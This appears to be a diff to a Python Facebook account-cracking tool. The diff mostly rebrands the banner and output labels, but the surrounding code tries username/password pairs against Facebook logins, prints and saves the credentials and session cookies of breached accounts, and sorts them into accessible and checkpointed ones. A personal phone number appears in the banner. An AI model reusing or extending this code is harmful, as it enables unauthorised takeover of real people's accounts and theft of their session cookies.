@@ -136,32 +136,35 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.03)
      
-logo = """\x1b[1;97m '
- ##:::'##::::'###:::::'######::'##::::'##:'####:'##:::'##::::'###::::
-. ##:'##::::'## ##:::'##... ##: ##:::: ##:. ##:: ##::'##::::'## ##:::
-:. ####::::'##:. ##:: ##:::..:: ##:::: ##:: ##:: ##:'##::::'##:. ##::
-::. ##::::'##:::. ##:. ######:: #########:: ##:: #####::::'##:::. ##:
-::: ##:::: #########::..... ##: ##.... ##:: ##:: ##. ##::: #########:
-::: ##:::: ##.... ##:'##::: ##: ##:::: ##:: ##:: ##:. ##:: ##.... ##:
-::: ##:::: ##:::: ##:. ######:: ##:::: ##:'####: ##::. ##: ##:::: ##:
-:::..:::::..:::::..:::......:::..:::::..::....::..::::..::..:::::..:: 
-\x1b[1;97m--------------------------------------
-\x1b[1;97m[+] Author  :  MAJID_KHAN💘YASHIKA SARANG       
-\x1b[1;97m[+] facebook:  KASH TU MILI HOTI_💔😔 
-\x1b[1;97m[+] Github  :  BROKEN HEART 💔_TOOL UPDATE 
-\x1b[1;97m[+] Version :\x1b[1;97m  Not Filled    \x1b[1;97m               
-\x1b[1;97m--------------------------------------
+logo = """\x1b[1;92m ███    ███  █████       ██ ██ ██████  
+████  ████ ██   ██      ██ ██ ██   ██ 
+██ ████ ██ ███████      ██ ██ ██   ██ 
+██  ██  ██ ██   ██ ██   ██ ██ ██   ██ 
+██      ██ ██   ██  █████  ██ ██████  
+                                      
+                                      
+\x1b[1;97m Ek Baar APNI Baahon Mein Sula To Shi
+
+\x1b[1;97m Jhuta Hi Magar Pyaar Dikha To Shi
+
+\x1b[1;97m Suna Hai Mangti Ho Rab Se Ki Khush Na Rahu
+
+\x1b[1;97m Mai Jeena Hi Chodd Dunga Tu Aa To Sahi
+
+\x1b[1;97m [ BROKEN💔MAJIDTOOL UPDATE :\x1b[1;97m  Not Filled    \x1b[1;97m  
+            
+\x1b[1;97m [ YASHIKA💔SAMAR CONTACT  +919050966900
   """
 
 #CRACK SELESAI
-def yashika(ok,cp):
+def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
         print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By James Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
         print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))
         print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(H,H,H,str(len(cp)),H))
         cek_cp = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
         if cek_cp =="":
-            print(f"\n [{M}!{N}] Don't be empty");YASHIKA💘SAMAR(ok,cp)
+            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
         elif cek_cp in["Y","y"]:
             jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(5)
             ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
@@ -190,7 +193,7 @@ def yashika(ok,cp):
         elif cek_cp in["T","t"]:
             jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python Run.py{N}'");exit()
         else:
-            print(f"\n {N}[{M}!{N}] Choose Y/t");YASHIKA💘SAMAR(ok,cp)
+            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
     else:
         jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()
 
@@ -264,7 +267,7 @@ class __chigoue__:
             self.chi(id)
     def __metode__(self, cebok, user, pasw):
         global ok,cp,loop
-        animasi = random.choice(["\x1b[1;92m[YASHIKA💘SAMAR]","\x1b[1;91m[YASHIKA💘SAMAR]","\x1b[1;93m[YASHIKA💘SAMAR]","\x1b[1;94m[YASHIKA💘SAMAR]","\x1b[1;95m[YASHIKA💘SAMAR]","\x1b[1;96m[YASHIKA💘SAMAR]","\x1b[1;97m[YASHIKA💘SAMAR]"])
+        animasi = random.choice(["\x1b[1;92m[NAME]","\x1b[1;91m[NAME]","\x1b[1;93m[NAME]","\x1b[1;94m[NAME]","\x1b[1;95m[NAME]","\x1b[1;96m[NAME]","\x1b[1;97m[NAME]"])
         sys.stdout.write(f"\r{O}{animasi} {BP}{loop}{N}|{BM}{len(self.id)}{N}][{H}OK:{len(ok)}{B}][{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
         sys.stdout.flush()
         try:
@@ -387,12 +390,12 @@ class __chigoue__:
                     cooz = session.cookies.get_dict()
                     coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                     if "t" in Apk:
-                        print('\r %s[YASHIKA💘SAMAR-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
+                        print('\r %s[BXB-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}\n')
                     elif "y" in Apk:
-                        print(f'\r %s[YASHIKA💘SAMAR-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
+                        print(f'\r %s[BXB-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}')
-                    wrt = '[YASHIKA💘SAMAE-OK] %s • %s' % (user,pw)
+                    wrt = '[BXB-OK] %s • %s' % (user,pw)
                     ok.append(wrt)
                     cek_apk(session,coki)
                     open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -404,7 +407,7 @@ class __chigoue__:
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
                         print('\r %sCP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
-                        wrt = '[YASHIKA💘SAMAR-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
+                        wrt = '[BXB-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                         cp.append(wrt)
                         open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                         break
@@ -413,8 +416,8 @@ class __chigoue__:
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r %s[YASHIKA💘SAMAR-CP] %s %s %s%s\n'%(K,user,pw,N))
-                    wrt = '[YASHIKA💘SAMAR-CP] %s • %s' % (user,pw)
+                    print('\r %s[BXB-CP] %s %s %s%s\n'%(K,user,pw,N))
+                    wrt = '[BXB-CP] %s • %s' % (user,pw)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -430,7 +433,7 @@ class __chigoue__:
 
     def __metode2__(self, cebok, user, pasw):
         global ok,cp,loop
-        animasi = random.choice(["\x1b[1;92m[YASHIKA💘SAMAR]","\x1b[1;92m[YASHIKA💘SAMAR]","\x1b[1;92m[YASHIKA💘SAMAR]","\x1b[1;92m[YASHIKA💘SAMAR]","\x1b[1;92m[YASHIKA💘SAMAR]","\x1b[1;92m[YASHIKA💘SAMAR]","\x1b[1;92m[BXB]"])
+        animasi = random.choice(["\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]"])
         sys.stdout.write(f"\r{N}{animasi} {N}{loop}{N}|{N}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
         sys.stdout.flush()
         try:
@@ -470,12 +473,12 @@ class __chigoue__:
                     cooz = session.cookies.get_dict()
                     coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                     if "t" in Apk:
-                        print('\r %s[YASHIKA💘SAMAR-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
+                        print('\r %s[BXB-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}\n')
                     elif "y" in Apk:
-                        print(f'\r %s[YASHIKA💘SAMAR-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
+                        print(f'\r %s[BXB-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}')
-                    wrt = '[YASHIKA💘SAMAR-OK] %s • %s' % (user,pw)
+                    wrt = '[BXB-OK] %s • %s' % (user,pw)
                     ok.append(wrt)
                     cek_apk(session,coki)
                     open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -496,8 +499,8 @@ class __chigoue__:
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r %s[YASHIKA💘SAMAR-CP] %s %s %s%s\n'%(K,user,pw,N))
-                    wrt = '[YASHIKA💘SAMAR-CP] %s • %s' % (user,pw)
+                    print('\r %s[BXB-CP] %s %s %s%s\n'%(K,user,pw,N))
+                    wrt = '[BXB-CP] %s • %s' % (user,pw)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
